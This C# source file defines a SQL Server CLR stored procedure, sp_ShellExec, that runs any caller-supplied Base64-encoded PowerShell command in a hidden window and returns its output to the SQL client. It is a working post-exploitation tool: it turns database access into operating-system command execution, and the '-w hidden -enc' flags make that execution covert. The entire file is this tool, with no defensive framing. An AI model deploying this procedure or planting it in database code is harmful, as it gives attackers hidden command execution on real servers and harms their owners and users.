using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.Data.SqlTypes;

public class StoredProcedures
{
	[Microsoft.SqlServer.Server.SqlProcedure] // Mark the method as Stored Procedure
	public static void sp_ShellExec(SqlString execCommand)
	{
		/* An example code for running command and returning the output */
		Process proc = new Process();
		proc.StartInfo.FileName = @"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe";
		proc.StartInfo.Arguments = string.Format(@" -w hidden -enc {0}", execCommand);
		proc.StartInfo.UseShellExecute = false;
		proc.StartInfo.RedirectStandardOutput = true; // Store the stdout in a pipe rather than print it to the console
		proc.Start();

		/* Retrive the stdout stored in a SQL pipe */
		SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
		SqlContext.Pipe.SendResultsStart(record);
		record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
		SqlContext.Pipe.SendResultsRow(record);
		SqlContext.Pipe.SendResultsEnd();

		/* Close the process only after it executes everything */
		proc.WaitForExit();
		proc.Close();
	}
}